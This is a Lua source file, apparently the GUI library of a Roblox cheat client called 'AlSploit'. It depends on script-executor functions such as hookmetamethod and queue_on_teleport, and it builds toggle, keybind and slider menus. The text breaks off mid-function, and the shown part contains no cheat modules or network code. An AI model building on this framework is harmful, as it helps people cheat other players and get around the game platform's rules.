local ReplicatedStorageService = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local LightingService = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local PlayerService = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TextService = game:GetService("TextService")
local RunService = game:GetService("RunService")
local WorkSpace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = PlayerService.LocalPlayer

local Mouse = LocalPlayer:GetMouse()

local Camera = WorkSpace.CurrentCamera

local AlSploitScreenGui = Instance.new("ScreenGui")

local ContainerFrame = Instance.new("Frame")
local ContainerUIListLayout = Instance.new("UIListLayout")

local NotificationContainer = Instance.new("Frame")
local NotificationContainerUIListLayout = Instance.new("UIListLayout")

local OpenGui = Instance.new("ImageButton")
local OpenGuiUICorner = Instance.new("UICorner")

local ChangeGuiToggleColorEvent = Instance.new("BindableEvent")
local ChangeGuiTitleColorEvent = Instance.new("BindableEvent")
local UnInjectEvent = Instance.new("BindableEvent")

local NotificationInstances = {}
local NotificationEvent = Instance.new("BindableEvent")
local NotificationCount = 0
local NotificationY = 0.88

local AlSploitConnections = {}

task.spawn(function()
	AlSploitConnections["NotificationRemoved"] = NotificationEvent.Event:Connect(function(Arguments)
		if Arguments.Name == "NotificationRemoved" then
			for i, v in next, NotificationInstances do
				if v.Position.Y.Scale < Arguments.Position.Y.Scale then
					local DesiredPosition = UDim2.new(v.Position.X.Scale, 0, (v.Position.Y.Scale + 0.105), 0)

					local TweenInformation = TweenInfo.new(0.24, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
					local PositionTween = TweenService:Create(v, TweenInformation, {Position = DesiredPosition})
					PositionTween:Play()
				end
			end
		end
	end)
end)

task.spawn(function()
	AlSploitScreenGui.Parent = LocalPlayer.PlayerGui
	AlSploitScreenGui.Name = "AlSploit"

	AlSploitScreenGui.OnTopOfCoreBlur = true
	AlSploitScreenGui.IgnoreGuiInset = true
	AlSploitScreenGui.ResetOnSpawn = false

	ContainerFrame.Parent = AlSploitScreenGui
	ContainerFrame.Name = "ContainerFrame"

	ContainerFrame.BackgroundTransparency = 1
	ContainerFrame.Position = UDim2.new(0, 0, 0.05, 0)
	ContainerFrame.Visible = false
	ContainerFrame.Size = UDim2.new(1, 0, 1, 0)

	ContainerUIListLayout.Parent = ContainerFrame
	ContainerUIListLayout.Name = "ContainerUIListLayout"

	ContainerUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	ContainerUIListLayout.FillDirection = Enum.FillDirection.Horizontal
	ContainerUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	ContainerUIListLayout.Padding = UDim.new(0, 50)

	NotificationContainer.Parent = AlSploitScreenGui
	NotificationContainer.Name = "NotificationContainer"

	NotificationContainer.BackgroundTransparency = 1
	NotificationContainer.BorderSizePixel = 0
	NotificationContainer.Position = UDim2.new(0.8, 0, 0, 0)
	NotificationContainer.Size = UDim2.new(0.2, 0, 0.980, 0)

	NotificationContainerUIListLayout.Parent = NotificationContainer
	NotificationContainerUIListLayout.Name = "NotificationContainerUIListLayout"

	NotificationContainerUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
	NotificationContainerUIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
	NotificationContainerUIListLayout.FillDirection = Enum.FillDirection.Vertical
	NotificationContainerUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	NotificationContainerUIListLayout.Padding = UDim.new(0, 10)

	OpenGui.Parent = AlSploitScreenGui
	OpenGui.Name = "OpenGui"

	OpenGui.BackgroundTransparency = 1
	OpenGui.AutoButtonColor = false
	OpenGui.BorderSizePixel = 0
	OpenGui.Position = UDim2.new(0.958, 0, 0.098, 0)
	OpenGui.Image = "rbxassetid://102141261324485"
	OpenGui.Size = UDim2.new(0.040, 0, 0.024, 0)

	OpenGuiUICorner.Parent = OpenGui
	OpenGuiUICorner.Name = "OpenGuiUICorner"

	OpenGuiUICorner.CornerRadius = UDim.new(0.2, 0)

	ChangeGuiToggleColorEvent.Parent = ReplicatedStorageService
	ChangeGuiToggleColorEvent.Name = "ChangeGuiToggleColorEvent"

	ChangeGuiTitleColorEvent.Parent = ReplicatedStorageService
	ChangeGuiTitleColorEvent.Name = "ChangeColorEvent"

	UnInjectEvent.Parent = ReplicatedStorageService
	UnInjectEvent.Name = "UnInjectEvent"

	task.spawn(function()
		OpenGui.Activated:Connect(function()
			ContainerFrame.Visible = not ContainerFrame.Visible
		end)
	end)
end)

local AlSploitSettings = {}

local CurrentAlSploitToggleColor = Color3.new(1, 1, 1)
local CurrentAlSploitTitleColor = Color3.new(1, 1, 1)

local DefaultLayoutOrder = 0
local AlSploitLibrary = {}

local WriteFile = writefile or function() CreateNotification(3, "Error, unable to use WriteFile") return nil end

local IsFile = isfile or function() CreateNotification(3, "Error, unable to use IsFile") return nil end

local ReadFile = readfile or function() CreateNotification(3, "Error, unable to use ReadFile") return nil end

local DeleteFile = delfile or function() CreateNotification(3, "Error, unable to use DeleteFile") return nil end

local QueueOnTeleport = queue_on_teleport or function() CreateNotification(3, "Error, unable to use QueueOnTeleport") return nil end
local SetFpsCap = setfpscap or function() CreateNotification(3, "Error, unable to use SetFpsCap") return nil end

local HookMetaMethod = hookmetamethod or function() CreateNotification(3, "Error, unable to use HookMetaMethod") return nil end

task.spawn(function()
	if IsFile and not IsFile("AlSploitConfiguration.json") and WriteFile then
		local EncodedSettings = HttpService:JSONEncode(AlSploitSettings)

		WriteFile("AlSploitConfiguration.json", EncodedSettings)
	end

	if not IsFile or not IsFile("AlSploitConfiguration.json") then
		CreateNotification(3, "Saving Folder Not Found")
	end
end)

task.spawn(function()
	if WriteFile and IsFile("AlSploitConfiguration.json") and ReadFile then
		local DecodedSettings = HttpService:JSONDecode(ReadFile("AlSploitConfiguration.json"))

		AlSploitSettings = DecodedSettings
	end

	if not ReadFile then
		CreateNotification(3, "Unable To Load Settings")
	end

	task.spawn(function()
		repeat
			if IsFile and IsFile("AlSploitConfiguration.json") and WriteFile then
				local EncodedSettings = HttpService:JSONEncode(AlSploitSettings)

				WriteFile("AlSploitConfiguration.json", EncodedSettings)
			end

			task.wait(0.5)
		until shared.AlSploitUnInjected == true
	end)
end)

function AlSploitLibrary:CreateTab(Name)	
	local Tab = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")

	local CornerFix = Instance.new("Frame")

	local ModuleContainer = Instance.new("ScrollingFrame")
	local UIListLayout = Instance.new("UIListLayout")

	local Title = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	Tab.Parent = ContainerFrame
	Tab.Name = "Tab"

	Tab.BackgroundColor3 = Color3.new(0, 0, 0)
	Tab.BorderSizePixel = 0
	Tab.Position = UDim2.new(0.434, 0, 0, 0)
	Tab.Size = UDim2.new(0.142, 0, 0.049, 0)

	UICorner.CornerRadius = UDim.new(0.2, 0)
	UICorner.Parent = Tab

	CornerFix.Parent = Tab
	CornerFix.Name = "CornerFix"

	CornerFix.BackgroundColor3 = Color3.new(0, 0, 0)
	CornerFix.BorderSizePixel = 0
	CornerFix.Position = UDim2.new(0, 0, 0.371, 0)
	CornerFix.Size = UDim2.new(1, 0, 0.629, 0)

	ModuleContainer.Parent = Tab
	ModuleContainer.Name = "ModuleContainer"

	ModuleContainer.BackgroundTransparency = 1
	ModuleContainer.ScrollBarThickness = (UserInputService.KeyboardEnabled and 0 or 3)
	ModuleContainer.BorderSizePixel = 0
	ModuleContainer.AutomaticSize = Enum.AutomaticSize.Y
	ModuleContainer.CanvasSize = UDim2.new(0, 0, 45, 0)
	ModuleContainer.Position = UDim2.new(0, 0, 1, 0)
	ModuleContainer.Size = UDim2.new(1, 0, 21.429, 0)

	UIListLayout.Parent = ModuleContainer
	UIListLayout.Name = "UIListLayout"

	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.FillDirection = Enum.FillDirection.Vertical
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	Title.Parent = Tab
	Title.Name = "Title"

	Title.BackgroundTransparency = 1
	Title.BorderSizePixel = 0
	Title.TextColor3 = Color3.new(0, 0.6, 1)
	Title.TextScaled = true
	Title.TextWrapped = true
	Title.TextSize = 20
	Title.Position = UDim2.new(0, 0, 0.124, 0)
	Title.Size = UDim2.new(1, 0, 0.743, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name

	UITextSizeConstraint.Parent = Title
	UITextSizeConstraint.Name = "UITextSizeConstraint2"

	UITextSizeConstraint.MaxTextSize = 20

	task.spawn(function()
		ChangeGuiTitleColorEvent.Event:Connect(function()
			Title.TextColor3 = CurrentAlSploitTitleColor
		end)
	end)

	local TabTable = {}

	function TabTable:CreateToggle(Information)
		local Name = Information.Name
		local Function = Information.Function
		local HoverText = Information.HoverText

		local Toggle = Instance.new("TextButton")
		local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
		local UIPadding = Instance.new("UIPadding")

		local DropdownButton = Instance.new("ImageButton")

		local ModuleInformation = Instance.new("TextLabel")
		local UICorner_2 = Instance.new("UICorner")
		local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")

		local CurrentLayoutOrder = 0

		if AlSploitSettings[Name] == nil then
			AlSploitSettings[Name] = {Value = false}
		end

		local function ToggleValue(Start)
			if Start == false then
				AlSploitSettings[Name].Value = not AlSploitSettings[Name].Value
			end

			if AlSploitSettings[Name].Value == true then
				Toggle.TextColor3 = CurrentAlSploitToggleColor

				task.spawn(function()
					if Start == true then
						task.wait(0.5)

						Function()
					end
				end)			

				task.spawn(function()
					if Start == false then
						Function()
					end
				end)
			end

			if AlSploitSettings[Name].Value == false then
				Toggle.TextColor3 = Color3.new(1, 1, 1)

				task.spawn(function()
					if Start == true then
						task.wait(0.5)

						Function()
					end
				end)

				task.spawn(function()
					if Start == false then
						Function()
					end
				end)
			end		
		end

		Toggle.Parent = ModuleContainer
		Toggle.Name = "Toggle"

		Toggle.BackgroundTransparency = 0.15
		Toggle.BackgroundColor3 = Color3.new(0, 0, 0)
		Toggle.AutoButtonColor = false
		Toggle.BorderSizePixel = 0
		Toggle.TextXAlignment = Enum.TextXAlignment.Left
		Toggle.TextColor3 = Color3.new(1, 1, 1)
		Toggle.TextScaled = true
		Toggle.TextSize = 14
		Toggle.Size = UDim2.new(1, 0, 0.039, 0)
		Toggle.Font = Enum.Font.GothamBold
		Toggle.Text = Name

		Toggle.LayoutOrder = DefaultLayoutOrder

		DefaultLayoutOrder = (DefaultLayoutOrder + 50)
		CurrentLayoutOrder = (DefaultLayoutOrder - 49)

		UIPadding.Parent = Toggle
		UIPadding.Name = "UIPadding"

		UIPadding.PaddingLeft = UDim.new(0, 15)

		UITextSizeConstraint_2.Parent = Toggle
		UITextSizeConstraint_2.Name = "UITextSizeConstraint_2"

		UITextSizeConstraint_2.MaxTextSize = 14

		DropdownButton.Parent = Toggle
		DropdownButton.Name = "DropdownButton"

		DropdownButton.BackgroundTransparency = 1
		DropdownButton.BorderSizePixel = 0
		DropdownButton.Position = UDim2.new(0.822, 0, 0.176, 0)
		DropdownButton.Rotation = 90
		DropdownButton.Image = "http://www.roblox.com/asset/?id=12809025337"
		DropdownButton.Size = UDim2.new(0.115, 0, 0.618, 0)

		ModuleInformation.Parent = AlSploitScreenGui
		ModuleInformation.Name = "ModuleInformation"

		ModuleInformation.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
		ModuleInformation.BorderSizePixel = 0
		ModuleInformation.TextColor3 = Color3.new(1, 1, 1)
		ModuleInformation.TextScaled = true
		ModuleInformation.TextSize = 11
		ModuleInformation.Visible = false
		ModuleInformation.ZIndex = 5
		ModuleInformation.Size = UDim2.new(1.199, 0, 0.32, 0 )
		ModuleInformation.Font = Enum.Font.GothamBold
		ModuleInformation.Text = HoverText

		local TextSize = TextService:GetTextSize(HoverText, 11, Enum.Font.GothamBold, Vector2.new(100000, 100000))

		ModuleInformation.Size = UDim2.new(0, (TextSize.X + 15), 0, (TextSize.Y + 4))

		UICorner_2.Parent = ModuleInformation
		UICorner_2.Name = "UICorner_2"

		UICorner_2.CornerRadius = UDim.new(0.4, 0)

		UITextSizeConstraint_3.Parent = ModuleInformation
		UITextSizeConstraint_3.Name = "UITextSizeConstraint_3"

		UITextSizeConstraint_3.MaxTextSize = 11

		task.spawn(function()
			ToggleValue(true)
		end)

		task.spawn(function()
			ChangeGuiToggleColorEvent.Event:Connect(function()
				if AlSploitSettings[Name].Value == true then
					Toggle.TextColor3 = CurrentAlSploitToggleColor
				end
			end)
		end)

		task.spawn(function()
			Toggle.Activated:Connect(function()
				ToggleValue(false)
			end)
		end)

		task.spawn(function()
			local FollowMouseValue = false

			task.spawn(function()
				Toggle.MouseLeave:Connect(function()
					ModuleInformation.Visible = false

					FollowMouseValue = false
				end)
			end)

			task.spawn(function()
				Toggle.MouseEnter:Connect(function()
					ModuleInformation.Visible = true

					FollowMouseValue = true
				end)
			end)

			task.spawn(function()
				Mouse.Move:Connect(function()
					if FollowMouseValue == true then
						local MousePosition = UserInputService:GetMouseLocation()

						ModuleInformation.Position = UDim2.new(0, MousePosition.X , 0, MousePosition.Y - 10)
					end
				end)
			end)
		end)

		local ToggleTable = {}

		function ToggleTable:CreateToggle(Arguments)
			local DefaultValue = Arguments.DefaultValue
			local Function_2 = Arguments.Function
			local Parent = Name
			local Name = Arguments.Name

			local MiniToggle = Instance.new("TextLabel")
			local UIPadding_2 = Instance.new("UIPadding")
			local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")

			local ToggleContainer = Instance.new("Frame")
			local UICorner_3 = Instance.new("UICorner")
			local UIGradient = Instance.new("UIGradient")

			local Toggle = Instance.new("TextButton")
			local UICorner_4 = Instance.new("UICorner")
			local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")

			if AlSploitSettings[Parent][Name] == nil then
				AlSploitSettings[Parent][Name] = {Value = DefaultValue}
			end

			local function ToggleValue(Start)
				if Start == false then
					AlSploitSettings[Parent][Name].Value = not AlSploitSettings[Parent][Name].Value
				end

				if AlSploitSettings[Parent][Name].Value == true then
					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.564706, 0.0313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.392157, 0.0431373, 1))}


					local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut, 0, false, 0)
					local ToggleTween = TweenService:Create(Toggle, TweenInformation, {Position = UDim2.new(0.06, 0, 0.1, 0)})

					ToggleTween:Play()

					Function_2()
				end

				if AlSploitSettings[Parent][Name].Value == false then
					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.133333, 0.133333, 0.1333337)), ColorSequenceKeypoint.new(1.00, Color3.new(0.133333, 0.133333, 0.1333337))}

					local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut, 0, false, 0)
					local ToggleTween = TweenService:Create(Toggle, TweenInformation, {Position = UDim2.new(0.46, 0, 0.1, 0)})

					ToggleTween:Play()

					Function_2()
				end	
			end

			MiniToggle.Parent = ModuleContainer
			MiniToggle.Name = "MiniToggle"

			MiniToggle.BackgroundTransparency = 0.15
			MiniToggle.BackgroundColor3 = Color3.new(0, 0, 0)
			MiniToggle.BorderSizePixel = 0
			MiniToggle.TextXAlignment = Enum.TextXAlignment.Left
			MiniToggle.TextColor3 = Color3.new(1, 1, 1)
			MiniToggle.TextScaled = true
			MiniToggle.TextSize = 11
			MiniToggle.Visible = false
			MiniToggle.Size = UDim2.new(1, 0, 0.041, 0)
			MiniToggle.Font = Enum.Font.GothamBold
			MiniToggle.Text = Name

			MiniToggle.LayoutOrder = CurrentLayoutOrder
			CurrentLayoutOrder = (CurrentLayoutOrder + 1)

			UIPadding_2.Parent = MiniToggle
			UIPadding_2.Name = "UIPadding_2"

			UIPadding_2.PaddingLeft = UDim.new(0, 15)

			UITextSizeConstraint_4.Parent = MiniToggle
			UITextSizeConstraint_4.Name = "UITextSizeConstraint_4"

			UITextSizeConstraint_4.MaxTextSize = 11

			ToggleContainer.Parent = MiniToggle
			ToggleContainer.Name = "ToggleContainer"

			ToggleContainer.BackgroundColor3 = Color3.new(1, 1, 1)
			ToggleContainer.BorderSizePixel = 0
			ToggleContainer.BorderColor3 = Color3.new(0, 0, 0)
			ToggleContainer.Position = UDim2.new(0.785, 0, 0.232, 0)
			ToggleContainer.Size = UDim2.new(0.163, 0, 0.497, 0)

			UICorner_3.Parent = ToggleContainer
			UICorner_3.Name = "UICorner_3"

			UICorner_3.CornerRadius = UDim.new(1, 0)

			UIGradient.Parent = ToggleContainer
			UIGradient.Name = "UIGradient"

			UIGradient.Rotation = 45
			UIGradient.Color = (AlSploitSettings[Parent][Name].Value == true and ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.564706, 0.0313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.392157, 0.0431373, 1))} or ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.133333, 0.133333, 0.1333337)), ColorSequenceKeypoint.new(1.00, Color3.new(0.133333, 0.133333, 0.1333337))})

			Toggle.Parent = ToggleContainer
			Toggle.Name = "Toggle"

			Toggle.BackgroundColor3 = Color3.new(0, 0, 0)
			Toggle.AutoButtonColor = false
			Toggle.BorderSizePixel = 0
			Toggle.TextScaled = true
			Toggle.TextSize = 14
			Toggle.Position = UDim2.new(0.040, 0, 0.100, 0)
			Toggle.Size = UDim2.new(0.500, 0, 0.800, 0)
			Toggle.Font = Enum.Font.GothamBold
			Toggle.Text = ""

			UICorner_4.Parent = Toggle
			UICorner_4.Name = "UICorner_4"

			UICorner_4.CornerRadius = UDim.new(1, 0)

			UITextSizeConstraint_5.Parent = Toggle
			UITextSizeConstraint_5.MaxTextSize = 14		

			task.spawn(function()
				ToggleValue(true)
			end)

			task.spawn(function()
				Toggle.Activated:Connect(function()
					ToggleValue(false)
				end)
			end)

			task.spawn(function()		
				DropdownButton.Activated:Connect(function()			
					MiniToggle.Visible = not MiniToggle.Visible
				end)
			end)
		end

		function ToggleTable:CreateKeybind()			
			local KeyBind = Instance.new("TextButton")
			local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
			local UIPadding_2 = Instance.new("UIPadding")

			local CanInputKeybind = false
			local InputWanted = false

			if not AlSploitSettings[Name].Keybind then
				AlSploitSettings[Name].Keybind = "..."
			end


			local function ToggleValue(Keybind)
				AlSploitSettings[Name].Keybind = Keybind			
				KeyBind.Text = "KeyBind: " .. Keybind
			end

			KeyBind.Parent = ModuleContainer
			KeyBind.Name = "KeyBind"

			KeyBind.BackgroundTransparency = 0.15
			KeyBind.BackgroundColor3 = Color3.new(0, 0, 0)
			KeyBind.AutoButtonColor = false
			KeyBind.BorderSizePixel = 0
			KeyBind.TextXAlignment = Enum.TextXAlignment.Left
			KeyBind.TextColor3 = Color3.new(255, 255, 255)
			KeyBind.TextScaled = true
			KeyBind.TextSize = 11
			KeyBind.Position = UDim2.new(0, 0, 0.082, 0)
			KeyBind.Visible = false
			KeyBind.Size = UDim2.new(1, 0, 0.035, 0)
			KeyBind.Font = Enum.Font.GothamBold
			KeyBind.Text = (AlSploitSettings[Name].Keybind == "..." and "KeyBind: " or "KeyBind: " .. AlSploitSettings[Name].Keybind)

			KeyBind.LayoutOrder = CurrentLayoutOrder
			CurrentLayoutOrder = (CurrentLayoutOrder + 1)

			UITextSizeConstraint_4.Parent = KeyBind
			UITextSizeConstraint_4.Name = "ITextSizeConstraint_4"

			UITextSizeConstraint_4.MaxTextSize = 11

			UIPadding_2.Parent = KeyBind
			UIPadding_2.Name = "UIPadding_2"

			UIPadding_2.PaddingLeft = UDim.new(0, 15)

			task.spawn(function()				
				KeyBind.Activated:Connect(function()	
					InputWanted = not InputWanted

					if CanInputKeybind == false and InputWanted == true then
						KeyBind.Text = "KeyBind: ..."

						CanInputKeybind = true
					end	

					if InputWanted == false then
						AlSploitSettings[Name].Keybind = "..."
						KeyBind.Text = "KeyBind: "

						CanInputKeybind = false
					end
				end)
			end)

			task.spawn(function()
				UserInputService.InputBegan:Connect(function(Input)	
					if CanInputKeybind == false and not UserInputService:GetFocusedTextBox() and AlSploitSettings[Name].Keybind == Input.KeyCode.Name then
						if AlSploitSettings[Name].Value == true then
							Toggle.TextColor3 = Color3.new(1, 1, 1)

							CreateNotification(3, Name .. " Has Been Toggled Off")
						end

						if AlSploitSettings[Name].Value == false then
							Toggle.TextColor3 = CurrentAlSploitToggleColor

							CreateNotification(3, Name .. " Has Been Toggled On")
						end

						AlSploitSettings[Name].Value = not AlSploitSettings[Name].Value

						Function()
					end

					if CanInputKeybind == true then
						if Input.UserInputType == Enum.UserInputType.Keyboard then
							CanInputKeybind = false
							InputWanted = false

							ToggleValue(Input.KeyCode.Name)
						end
					end
				end)
			end)

			task.spawn(function()		
				DropdownButton.Activated:Connect(function()			
					KeyBind.Visible = not KeyBind.Visible
				end)
			end)			
		end

		function ToggleTable:CreateSlider(Arguments)
			local DefaultValue = Arguments.DefaultValue
			local MaximumValue = Arguments.MaximumValue
			local Function_2 = Arguments.Function
			local Parent = Name
			local Name = Arguments.Name

			local Slider = Instance.new("Frame")

			local SliderFrame = Instance.new("Frame")

			local Fill = Instance.new("Frame")
			local UIGradient = Instance.new("UIGradient")

			local Bar = Instance.new("TextButton")
			local UICorner_3 = Instance.new("UICorner")
			local UIStroke = Instance.new("UIStroke")
			local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")

			local NameDisplay = Instance.new("TextLabel")
			local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")

			local ValueDisplay = Instance.new("TextLabel")
			local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")

			if AlSploitSettings[Parent][Name] == nil then
				AlSploitSettings[Parent][Name] = {Value = DefaultValue}
			end

			Slider.Parent = ModuleContainer
			Slider.Name = "Slider"

			Slider.BackgroundTransparency = 0.15
			Slider.BackgroundColor3 = Color3.new(0, 0, 0)
			Slider.BorderSizePixel = 0
			Slider.Position = UDim2.new(0, 0, 0.117, 0)
			Slider.Visible = false
			Slider.Size = UDim2.new(1, 0, 0.064, 0)

			Slider.LayoutOrder = CurrentLayoutOrder
			CurrentLayoutOrder = (CurrentLayoutOrder + 1)

			SliderFrame.Parent = Slider
			SliderFrame.Name = "SliderFrame"

			SliderFrame.BackgroundTransparency = 1
			SliderFrame.BorderSizePixel = 0
			SliderFrame.Position = UDim2.new(0.150, 0, 0.654, 0)
			SliderFrame.Size = UDim2.new(0.700, 0, 0.060, 0)

			Fill.Parent = SliderFrame
			Fill.Name = "Fill"

			Fill.BackgroundColor3 = Color3.new(1, 1, 1)
			Fill.BorderSizePixel = 0
			Fill.Position = UDim2.new(0, 0, -0.329, 0)
			Fill.Size = UDim2.new(1, 0, 1, 0)

			UIGradient.Parent = Fill
			UIGradient.Name = "UIGradient"

			UIGradient.Rotation = 180
			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.564706, 0.0313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.392157, 0.0431373, 1))}

			Bar.Parent = SliderFrame
			Bar.Name = "Bar"

			Bar.BackgroundColor3 = Color3.new(0.564706, 0.0313725, 1)
			Bar.AutoButtonColor = false
			Bar.BorderSizePixel = 0
			Bar.TextScaled = true
			Bar.TextSize = 14
			Bar.Position = UDim2.new(0.135, 0, -1.500, 0)
			Bar.ZIndex = 2
			Bar.Size = UDim2.new(0.070, 0, 3.090, 0)		
			Bar.Font = Enum.Font.GothamBold
			Bar.Text = ""

			UICorner_3.Parent = Bar
			UICorner_3.Name = "UICorner_3"

			UICorner_3.CornerRadius = UDim.new(1, 0)

			UIStroke.Parent = Bar
			UIStroke.Name = "UIStroke"

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Thickness = 1
			UIStroke.Color = Color3.new(0, 0, 0)

			UITextSizeConstraint_4.Parent = Bar
			UITextSizeConstraint_4.Name = "UITextSizeConstraint_6"

			UITextSizeConstraint_4.MaxTextSize = 14

			NameDisplay.Parent = Slider
			NameDisplay.Name = "NameDisplay"

			NameDisplay.BackgroundTransparency = 1
			NameDisplay.BorderSizePixel = 0
			NameDisplay.TextColor3 = Color3.new(1, 1, 1)
			NameDisplay.TextScaled = true
			NameDisplay.TextSize = 10
			NameDisplay.Position = UDim2.new(0.145, 0, 0.08, 0)
			NameDisplay.Size = UDim2.new(0.250, 0, 0.543, 0)
			NameDisplay.Font = Enum.Font.GothamBold
			NameDisplay.Text = Name

			UITextSizeConstraint_5.Parent = NameDisplay
			UITextSizeConstraint_5.MaxTextSize = 10

			ValueDisplay.Parent = Slider
			ValueDisplay.Name = "ValueDisplay"

			ValueDisplay.BackgroundTransparency = 1
			ValueDisplay.BorderSizePixel = 0
			ValueDisplay.TextColor3 = Color3.new(1, 1, 1)
			ValueDisplay.TextScaled = true
			ValueDisplay.TextSize = 10
			ValueDisplay.Position = UDim2.new(0.635, 0, 0.08, 0)
			ValueDisplay.Size = UDim2.new(0.250, 0, 0.543, 0)
			ValueDisplay.Font = Enum.Font.GothamBold
			ValueDisplay.Text = AlSploitSettings[Parent][Name].Value

			UITextSizeConstraint_6.Parent = ValueDisplay
			UITextSizeConstraint_6.MaxTextSize = 10

			local CanUseSlider = false

			local function Snap(Number, Factor)			
				return (Factor == 0 and Number or (math.floor(Number / Factor) * Factor))
			end

			task.spawn(function()				
				Fill.Size = UDim2.new((AlSploitSettings[Parent][Name].Value / MaximumValue), 0, 1, 0)
				Bar.Position = UDim2.new((AlSploitSettings[Parent][Name].Value / MaximumValue), 0, Bar.Position.Y.Scale, 0)

				Function_2()
			end)

			task.spawn(function()
				Bar.MouseButton1Down:Connect(function()
					CanUseSlider = true
				end)				
			end)

			task.spawn(function()
				UserInputService.InputEnded:Connect(function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 or Enum.UserInputType.Touch then
						CanUseSlider = false
					end
				end)
			end)

			task.spawn(function()
				DropdownButton.Activated:Connect(function()
					Slider.Visible = not Slider.Visible

					task.spawn(function()
						repeat
							task.wait()

							if CanUseSlider == true then
								local MousePosition = UserInputService:GetMouseLocation().X
								local FramePosition = Slider.AbsolutePosition.X
								local BarPosition = Bar.Position
								local FrameSize = Slider.AbsoluteSize.X

								local Position = ((MousePosition - FramePosition) / FrameSize)
								local Percentage = math.clamp(Position, 0, 1)

								local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
								local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(Percentage, 0, BarPosition.Y.Scale, 0)})

								PositionTween:Play()

								local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
								local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(Percentage, 0, 1, 0)})

								SizeTween:Play()

								ValueDisplay.Text = math.round(Percentage * MaximumValue)

								AlSploitSettings[Parent][Name].Value = math.round(Percentage * MaximumValue)

								Function_2()
							end
						until shared.AlSploitUnInjected == true or Slider.Visible == false
					end)
				end)
			end)
		end

		local DropdownTable = {}

		function ToggleTable:CreateDropdown(Arguments)
			local HoverText_2 = Arguments.HoverText
			local Parent = Name
			local Name = Arguments.Name

			if AlSploitSettings[Parent][Name] == nil then
				AlSploitSettings[Parent][Name] = {}
			end

			local Dropdown = Instance.new("Frame")

			local OptionsContainer = Instance.new("ScrollingFrame")
			local UIListLayout_2 = Instance.new("UIListLayout")

			local DropdownText = Instance.new("TextLabel")
			local UIPadding_2 = Instance.new("UIPadding")
			local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")

			local ModuleInformation_2 = Instance.new("TextLabel")
			local UICorner_3 = Instance.new("UICorner")
			local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")

			Dropdown.Parent = ModuleContainer
			Dropdown.Name = "Dropdown"

			Dropdown.BackgroundTransparency = 0.15
			Dropdown.BackgroundColor3 = Color3.new(0, 0, 0)
			Dropdown.BorderSizePixel = 0
			Dropdown.Visible = false
			Dropdown.Position = UDim2.new(0.085, 0, 0.181, 0)
			Dropdown.Size = UDim2.new(1, 0, 0.106, 0)

			Dropdown.LayoutOrder = CurrentLayoutOrder
			CurrentLayoutOrder = (CurrentLayoutOrder + 1)

			OptionsContainer.Parent = Dropdown
			OptionsContainer.Name = "OptionsContainer"

			OptionsContainer.BackgroundTransparency = 1
			OptionsContainer.ScrollBarThickness = 0
			OptionsContainer.BorderSizePixel = 0
			OptionsContainer.CanvasSize = UDim2.new(0, 0, 1.5, 0)
			OptionsContainer.Position = UDim2.new(0, 0, 0.290, 0)
			OptionsContainer.Size = UDim2.new(1, 0, 0.710, 0)

			UIListLayout_2.Parent = OptionsContainer
			UIListLayout_2.Name = "UIListLayout_2"

			UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
			UIListLayout_2.FillDirection = Enum.FillDirection.Vertical
			UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

			DropdownText.Parent = Dropdown
			DropdownText.Name = "DropdownText"

			DropdownText.BackgroundTransparency = 1
			DropdownText.BorderSizePixel = 0
			DropdownText.TextXAlignment = Enum.TextXAlignment.Left
			DropdownText.TextColor3 = Color3.new(1, 1, 1)
			DropdownText.TextScaled = true
			DropdownText.TextSize = 12
			DropdownText.Size = UDim2.new(1, 0, 0.290, 0)
